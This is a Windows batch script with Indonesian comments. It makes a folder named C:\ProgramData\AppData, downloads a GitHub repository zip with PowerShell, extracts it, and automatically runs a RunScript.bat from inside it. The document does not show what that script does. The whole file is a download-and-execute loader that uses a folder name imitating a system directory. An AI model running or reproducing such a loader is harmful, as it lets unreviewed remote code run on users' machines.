@echo off
:: Membuat folder untuk simpan hasil download
mkdir "C:\ProgramData\AppData"

:: Pindah ke folder tersebut
cd /d "C:\ProgramData\AppData"

:: Download file dari GitHub
powershell -Command "Invoke-WebRequest -Uri 'https://codeload.github.com/FooTex16/XMASTERTES/zip/refs/heads/main' -OutFile 'XMASTERTES.zip'"

:: Jeda 60 detik
timeout /t 60 >nul

:: Ekstrak file menggunakan metode bawaan Windows (jika PowerShell 5.0+ tersedia)
powershell -Command "Expand-Archive -Path 'XMASTERTES.zip' -DestinationPath 'C:\ProgramData\AppData' -Force"

:: Jeda 5 detik
timeout /t 5 >nul

:: Buka File Explorer
start explorer "C:\ProgramData\AppData\XMASTERTES-main"

:: Jeda 8 detik
timeout /t 8 >nul

:: Jalankan script RunScript.bat jika ada
start "" "C:\ProgramData\AppData\XMASTERTES-main\RunScript.bat"

:: Tutup cmd
exit
